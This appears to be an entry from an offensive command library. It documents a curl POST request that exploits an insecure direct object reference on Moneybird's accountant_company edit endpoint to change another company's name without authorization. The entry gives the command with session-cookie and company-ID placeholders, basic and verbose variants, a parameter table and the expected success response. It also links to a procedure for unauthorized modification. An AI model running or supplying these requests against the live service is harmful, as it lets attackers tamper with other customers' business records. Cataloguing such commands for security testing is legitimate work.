---
id: cmd-uuid-2
data: >-
  curl -X POST -H "Cookie: session=your_session_cookie" -d
  "company_name=Modified Company Name&company_id=TARGET_COMPANY_ID"
  https://moneybird.com/user/accountant_company/edit
tags:
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.485Z'
verified: false
validated: true
submitted: true
---
# curl-modify-company-name

## Command

```bash
curl -X POST -H "Cookie: session=your_session_cookie" -d "company_name=Modified Company Name&company_id=TARGET_COMPANY_ID" https://moneybird.com/user/accountant_company/edit
```

## Description

This command simulates form submission to modify the company name via the Moneybird IDOR-vulnerable endpoint. It sends POST data to alter details without authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Cookie: session=..."` | Authentication header | Yes |
| `-d "company_name=...&company_id=..."` | Form data payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Cookie: session=abc123" -d "company_name=New Name&company_id=456" https://moneybird.com/user/accountant_company/edit
```

### Advanced Usage

```bash
curl -v -X POST -H "Cookie: session=abc123" -d "company_name=New Name&company_id=456" https://moneybird.com/user/accountant_company/edit
```

## Expected Output

Response indicating successful update, such as a 200 OK or redirect. Verify by re-accessing the company details.

## Related

- [[Related Procedure|procedures/Modify-Company-Name-Without-Authorization]]
